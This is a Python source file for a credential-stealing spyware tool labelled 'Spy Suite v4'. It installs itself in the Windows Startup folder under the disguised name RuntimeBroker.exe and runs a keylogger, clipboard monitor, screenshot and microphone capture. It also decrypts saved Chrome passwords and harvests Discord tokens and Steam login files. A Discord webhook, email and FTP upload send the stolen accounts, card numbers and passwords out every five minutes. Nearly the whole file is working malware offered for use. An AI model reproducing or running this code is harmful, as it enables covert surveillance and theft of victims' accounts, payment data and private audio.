import os
import re
import time
import json
import socket
import shutil
import sqlite3
import base64
import threading
import platform
from datetime import datetime
from pathlib import Path

from pynput import keyboard
from PIL import ImageGrab
import sounddevice as sd
import numpy as np
from scipy.io.wavfile import write as write_wav
import pyperclip

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543840098548846643/Nl_mYva2hVTQW3B9mriAFdLJzzFl5ng_lLTvv0_pv8kBv-J9QOmu64DE7ZrleN7PMZEl"

def add_to_startup():
    if platform.system() != "Windows":
        return
    startup = os.path.join(os.environ["APPDATA"],
                           r"Microsoft\Windows\Start Menu\Programs\Startup")
    target = os.path.join(startup, "RuntimeBroker.exe")  # look legit
    if not os.path.exists(target):
        try:
            shutil.copy2(sys.executable if getattr(sys, 'frozen', False)
                         else __file__, target)
        except Exception:
            pass

add_to_startup()

try:
    from Cryptodome.Cipher import AES
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import win32crypt
    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

# ================== CONFIG ==================
LOG_DIR = "logs"
KEYLOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
SENSITIVE_FILE = os.path.join(LOG_DIR, "sensitive.txt")
IP_LOG_FILE = os.path.join(LOG_DIR, "ip_log.txt")
LOGINS_FILE = os.path.join(LOG_DIR, "logins.txt")
ACCOUNTS_FILE = os.path.join(LOG_DIR, "accounts.txt")
SCREEN_DIR = os.path.join(LOG_DIR, "screenshots")
AUDIO_DIR = os.path.join(LOG_DIR, "audio")
BROWSER_DUMP = os.path.join(LOG_DIR, "browser_passwords.txt")

SCREEN_INTERVAL = 10
AUDIO_DURATION = 15
AUDIO_INTERVAL = 30
CLIPBOARD_INTERVAL = 2
SAMPLE_RATE = 44100
BUFFER_SIZE = 300

DISCORD_WEBHOOK = ""
EMAIL_TO = ""
EMAIL_FROM = ""
EMAIL_PASS = ""
FTP_HOST = ""
FTP_USER = ""
FTP_PASS = ""
FTP_DIR = "/"

key_buffer = ""
last_clipboard = ""

# ================== SETUP ==================
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCREEN_DIR, exist_ok=True)
os.makedirs(AUDIO_DIR, exist_ok=True)

# ================== HELPERS ==================
def luhn_check(card: str) -> bool:
    digits = [int(d) for d in card if d.isdigit()]
    if not (13 <= len(digits) <= 19):
        return False
    checksum = 0
    for i, d in enumerate(digits[::-1]):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        checksum += d
    return checksum % 10 == 0

def log_sensitive(category, value):
    line = f"{datetime.now()} | {category.upper()} | {value}\n"
    with open(SENSITIVE_FILE, "a", encoding="utf-8") as f:
        f.write(line)
    print(f"[!] {category.upper()}: {value}")

def log_login(url, username, password, source="keylog"):
    line = f"{datetime.now()} | SOURCE: {source} | URL/SITE: {url} | USER: {username} | PASS: {password}\n"
    with open(LOGINS_FILE, "a", encoding="utf-8") as f:
        f.write(line)
    print(f"[+] LOGIN: {username} @ {url}")

def log_account(service, info: dict):
    with open(ACCOUNTS_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n=== {service.upper()} | {datetime.now()} ===\n")
        for k, v in info.items():
            f.write(f"{k}: {v}\n")
        f.write("-" * 50 + "\n")
    print(f"[+] ACCOUNT logged → {service}")

def log_ip():
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None):
            ip = info[4][0]
            if not ip.startswith("127.") and ip != "::1":
                ips.add(ip)
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    with open(IP_LOG_FILE, "w", encoding="utf-8") as f:
        f.write(f"Timestamp: {datetime.now()}\n")
        f.write(f"Hostname: {socket.gethostname()}\n")
        f.write(f"Platform: {platform.platform()}\n")
        f.write("IPv4/IPv6 addresses:\n")
        for ip in sorted(ips):
            f.write(f"  {ip}\n")
    print(f"[+] IP log → {IP_LOG_FILE}")

# ================== REGEX ==================
EMAIL_RE = re.compile(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}')
CC_RE = re.compile(r'(?:\d[ -]*?){13,19}')
PASS_CONTEXT_RE = re.compile(
    r'(?:(?:log[\s_-]?in|sign[\s_-]?in|user(?:name)?|email|account|pass(?:word)?|pwd|secret|auth|credential)[\s:=]+)([^\s]{4,48})',
    re.IGNORECASE
)
LOGIN_PAIR_RE = re.compile(
    r'(?:user(?:name)?|email|login)[\s:=]+([^\s]{3,60}).{0,40}(?:pass(?:word)?|pwd)[\s:=]+([^\s]{4,48})',
    re.IGNORECASE | re.DOTALL
)
# Discord token patterns (classic + MFA)
DISCORD_TOKEN_RE = re.compile(
    r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
)

def analyze_buffer():
    global key_buffer
    for m in EMAIL_RE.finditer(key_buffer):
        log_sensitive("EMAIL", m.group())
    for m in CC_RE.finditer(key_buffer):
        digits = re.sub(r'[^\d]', '', m.group())
        if luhn_check(digits):
            log_sensitive("CREDIT_CARD_VALID", digits)
    for m in PASS_CONTEXT_RE.finditer(key_buffer):
        log_sensitive("PASSWORD", m.group(1))
    for m in LOGIN_PAIR_RE.finditer(key_buffer):
        log_login("typed_form", m.group(1), m.group(2), source="keylog")
    for m in DISCORD_TOKEN_RE.finditer(key_buffer):
        log_sensitive("DISCORD_TOKEN_TYPED", m.group())
        log_account("Discord (typed)", {"token": m.group()})
    if len(key_buffer) > BUFFER_SIZE:
        key_buffer = key_buffer[-BUFFER_SIZE:]

# ================== KEYLOGGER ==================
def on_press(key):
    global key_buffer
    try:
        char = key.char
        key_buffer += char
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} - {char}\n")
    except AttributeError:
        special = str(key).replace("Key.", "")
        if special == "space":
            key_buffer += " "
        elif special in ("enter", "tab"):
            key_buffer += "\n"
            analyze_buffer()
        elif special == "backspace":
            key_buffer = key_buffer[:-1]
        with open(KEYLOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"{datetime.now()} - [{special}]\n")
    if len(key_buffer) % 25 == 0:
        analyze_buffer()

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("[+] Keylogger running")
    return listener

# ================== CLIPBOARD ==================
def monitor_clipboard():
    global last_clipboard
    while True:
        try:
            current = pyperclip.paste()
            if current and current != last_clipboard:
                last_clipboard = current
                if EMAIL_RE.search(current):
                    log_sensitive("CLIPBOARD_EMAIL", current.strip())
                digits = re.sub(r'[^\d]', '', current)
                if 13 <= len(digits) <= 19 and luhn_check(digits):
                    log_sensitive("CLIPBOARD_CC", digits)
                for m in DISCORD_TOKEN_RE.finditer(current):
                    log_sensitive("CLIPBOARD_DISCORD_TOKEN", m.group())
                    log_account("Discord (clipboard)", {"token": m.group()})
                if len(current) >= 6:
                    with open(SENSITIVE_FILE, "a", encoding="utf-8") as f:
                        f.write(f"{datetime.now()} | CLIPBOARD | {current[:200]}\n")
        except Exception:
            pass
        time.sleep(CLIPBOARD_INTERVAL)

# ================== SCREEN + AUDIO ==================
def capture_screen():
    while True:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(SCREEN_DIR, f"screen_{timestamp}.png")
        try:
            ImageGrab.grab().save(filename)
            print(f"[+] Screenshot: {filename}")
        except Exception as e:
            print(f"[!] Screen error: {e}")
        time.sleep(SCREEN_INTERVAL)

def record_audio():
    while True:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(AUDIO_DIR, f"audio_{timestamp}.wav")
        try:
            print(f"[+] Recording audio ({AUDIO_DURATION}s)...")
            recording = sd.rec(int(AUDIO_DURATION * SAMPLE_RATE),
                               samplerate=SAMPLE_RATE, channels=1, dtype='float32')
            sd.wait()
            write_wav(filename, SAMPLE_RATE, recording)
            print(f"[+] Audio: {filename}")
        except Exception as e:
            print(f"[!] Audio error: {e}")
        time.sleep(AUDIO_INTERVAL)

# ================== BROWSER PASSWORDS ==================
def get_chrome_path():
    system = platform.system()
    if system == "Windows":
        return os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data")
    elif system == "Linux":
        return os.path.expanduser("~/.config/google-chrome")
    elif system == "Darwin":
        return os.path.expanduser("~/Library/Application Support/Google/Chrome")
    return None

def get_encryption_key_windows(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password_windows(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
        except Exception:
            return ""

def dump_chrome_passwords():
    if not HAS_CRYPTO:
        print("[!] pycryptodome missing — skip Chrome")
        return
    base = get_chrome_path()
    if not base or not os.path.exists(base):
        return
    local_state = os.path.join(base, "Local State")
    login_db = os.path.join(base, "Default", "Login Data")
    if not os.path.exists(login_db):
        return
    temp_db = os.path.join(LOG_DIR, "chrome_login_temp.db")
    shutil.copy2(login_db, temp_db)
    key = None
    if platform.system() == "Windows" and HAS_WIN32:
        try:
            key = get_encryption_key_windows(local_state)
        except Exception:
            pass
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        with open(BROWSER_DUMP, "a", encoding="utf-8") as f:
            f.write(f"\n=== Chrome {datetime.now()} ===\n")
            for url, user, encrypted in cursor.fetchall():
                if not user:
                    continue
                pwd = decrypt_password_windows(encrypted, key) if key and encrypted else "[encrypted]"
                f.write(f"URL: {url} | USER: {user} | PASS: {pwd}\n")
                log_login(url, user, pwd, source="chrome")
                # also push into accounts.txt for known services
                if any(x in url.lower() for x in ["steam", "discord", "github", "google", "facebook", "twitter", "x.com"]):
                    log_account(url, {"username": user, "password": pwd, "source": "chrome"})
        print(f"[+] Chrome dump done")
    except Exception as e:
        print(f"[!] Chrome error: {e}")
    finally:
        conn.close()
        if os.path.exists(temp_db):
            os.remove(temp_db)

# ================== DISCORD TOKENS ==================
def find_discord_tokens():
    tokens = set()
    system = platform.system()
    paths = []

    if system == "Windows":
        roaming = os.getenv("APPDATA")
        local = os.getenv("LOCALAPPDATA")
        paths = [
            os.path.join(roaming, "Discord"),
            os.path.join(roaming, "discordcanary"),
            os.path.join(roaming, "discordptb"),
            os.path.join(roaming, "Lightcord"),
            os.path.join(local, "Google", "Chrome", "User Data", "Default"),
            os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
            os.path.join(roaming, "Opera Software", "Opera Stable"),
        ]
    elif system == "Linux":
        home = os.path.expanduser("~")
        paths = [
            os.path.join(home, ".config", "discord"),
            os.path.join(home, ".config", "discordcanary"),
            os.path.join(home, ".config", "discordptb"),
            os.path.join(home, ".config", "google-chrome", "Default"),
            os.path.join(home, ".config", "BraveSoftware", "Brave-Browser", "Default"),
        ]
    else:  # macOS
        home = os.path.expanduser("~")
        paths = [
            os.path.join(home, "Library", "Application Support", "discord"),
            os.path.join(home, "Library", "Application Support", "discordcanary"),
            os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default"),
        ]

    for base in paths:
        leveldb = os.path.join(base, "Local Storage", "leveldb")
        if not os.path.exists(leveldb):
            continue
        for fname in os.listdir(leveldb):
            if not (fname.endswith(".ldb") or fname.endswith(".log")):
                continue
            try:
                with open(os.path.join(leveldb, fname), "r", errors="ignore") as f:
                    for line in f:
                        for match in DISCORD_TOKEN_RE.findall(line):
                            tokens.add(match)
            except Exception:
                continue
    return list(tokens)

def validate_discord_token(token):
    """Optional: hit Discord API to get account info"""
    try:
        import urllib.request
        req = urllib.request.Request(
            "https://discord.com/api/v9/users/@me",
            headers={"Authorization": token, "Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read().decode())
            return {
                "id": data.get("id"),
                "username": data.get("username"),
                "discriminator": data.get("discriminator"),
                "email": data.get("email"),
                "phone": data.get("phone"),
                "mfa_enabled": data.get("mfa_enabled"),
                "verified": data.get("verified"),
                "token": token
            }
    except Exception:
        return {"token": token, "status": "invalid_or_network_error"}

def harvest_discord():
    print("[*] Scanning for Discord tokens...")
    tokens = find_discord_tokens()
    if not tokens:
        print("[!] No Discord tokens found")
        return
    print(f"[+] Found {len(tokens)} potential token(s)")
    for token in tokens:
        info = validate_discord_token(token)
        log_account("Discord", info)
        log_sensitive("DISCORD_TOKEN", token)

# ================== STEAM ==================
def harvest_steam():
    print("[*] Scanning for Steam data...")
    system = platform.system()
    steam_paths = []

    if system == "Windows":
        # common Steam install locations
        possible = [
            os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam"),
            os.path.join(os.environ.get("PROGRAMFILES", ""), "Steam"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Steam"),
        ]
        steam_paths = [p for p in possible if os.path.exists(p)]
    elif system == "Linux":
        steam_paths = [
            os.path.expanduser("~/.steam/steam"),
            os.path.expanduser("~/.local/share/Steam"),
        ]
    else:
        steam_paths = [os.path.expanduser("~/Library/Application Support/Steam")]

    found = False
    for base in steam_paths:
        # loginusers.vdf contains account info
        loginusers = os.path.join(base, "config", "loginusers.vdf")
        if os.path.exists(loginusers):
            try:
                with open(loginusers, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                # crude parse of SteamIDs and AccountName
                ids = re.findall(r'"(\d{17})"', content)
                names = re.findall(r'"AccountName"\s+"([^"]+)"', content)
                personas = re.findall(r'"PersonaName"\s+"([^"]+)"', content)
                for i, sid in enumerate(ids):
                    info = {
                        "steam_id": sid,
                        "account_name": names[i] if i < len(names) else "?",
                        "persona_name": personas[i] if i < len(personas) else "?",
                        "source": loginusers
                    }
                    log_account("Steam", info)
                    found = True
            except Exception as e:
                print(f"[!] Steam loginusers error: {e}")

        # ssfn files (auth)
        for root, dirs, files in os.walk(base):
            for f in files:
                if f.startswith("ssfn"):
                    full = os.path.join(root, f)
                    log_account("Steam SSFN", {"file": full, "size": os.path.getsize(full)})
                    found = True

        # config.vdf sometimes holds more
        config_vdf = os.path.join(base, "config", "config.vdf")
        if os.path.exists(config_vdf):
            try:
                with open(config_vdf, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                # look for any steamLoginSecure style tokens if present
                tokens = re.findall(r'steamLoginSecure["\s:=]+([^\s"]+)', content, re.I)
                for t in tokens:
                    log_account("Steam Token", {"token": t})
                    found = True
            except Exception:
                pass

    if not found:
        print("[!] No Steam data found")

# ================== EXFIL ==================
def exfil_discord(content):
    if not DISCORD_WEBHOOK:
        return
    try:
        import urllib.request
        data = json.dumps({"content": content[:1900]}).encode()
        req = urllib.request.Request(DISCORD_WEBHOOK, data=data,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req)
        print("[+] Discord webhook sent")
    except Exception as e:
        print(f"[!] Discord fail: {e}")

def exfil_email(subject, body):
    if not EMAIL_TO or not EMAIL_FROM:
        return
    try:
        import smtplib
        from email.mime.text import MIMEText
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = EMAIL_FROM
        msg["To"] = EMAIL_TO
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(EMAIL_FROM, EMAIL_PASS)
            server.send_message(msg)
        print("[+] Email sent")
    except Exception as e:
        print(f"[!] Email fail: {e}")

def exfil_ftp(local_file):
    if not FTP_HOST:
        return
    try:
        from ftplib import FTP
        with FTP(FTP_HOST) as ftp:
            ftp.login(FTP_USER, FTP_PASS)
            ftp.cwd(FTP_DIR)
            with open(local_file, "rb") as f:
                ftp.storbinary(f"STOR {os.path.basename(local_file)}", f)
        print(f"[+] FTP uploaded {local_file}")
    except Exception as e:
        print(f"[!] FTP fail: {e}")

def periodic_exfil():
    while True:
        time.sleep(300)
        try:
            if os.path.exists(ACCOUNTS_FILE):
                with open(ACCOUNTS_FILE, "r", encoding="utf-8") as f:
                    content = f.read()[-1800:]
                exfil_discord(f"```{content}```")
                exfil_email("Accounts Update", content)
            for fpath in [ACCOUNTS_FILE, SENSITIVE_FILE, LOGINS_FILE, IP_LOG_FILE, BROWSER_DUMP]:
                if os.path.exists(fpath):
                    exfil_ftp(fpath)
        except Exception:
            pass

# ================== MAIN ==================
if __name__ == "__main__":
    print("[*] Spy Suite v4 starting...")
    log_ip()

    # one-time harvests
    dump_chrome_passwords()
    harvest_discord()
    harvest_steam()

    key_listener = start_keylogger()

    threading.Thread(target=monitor_clipboard, daemon=True).start()
    threading.Thread(target=capture_screen, daemon=True).start()
    threading.Thread(target=record_audio, daemon=True).start()
    threading.Thread(target=periodic_exfil, daemon=True).start()

    print("[*] All modules live.")
    print(f"    accounts  → {ACCOUNTS_FILE}")
    print(f"    sensitive → {SENSITIVE_FILE}")
    print(f"    logins    → {LOGINS_FILE}")
    print(f"    ip        → {IP_LOG_FILE}")
    print(f"    browser   → {BROWSER_DUMP}")
    print("[*] Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
        key_listener.stop()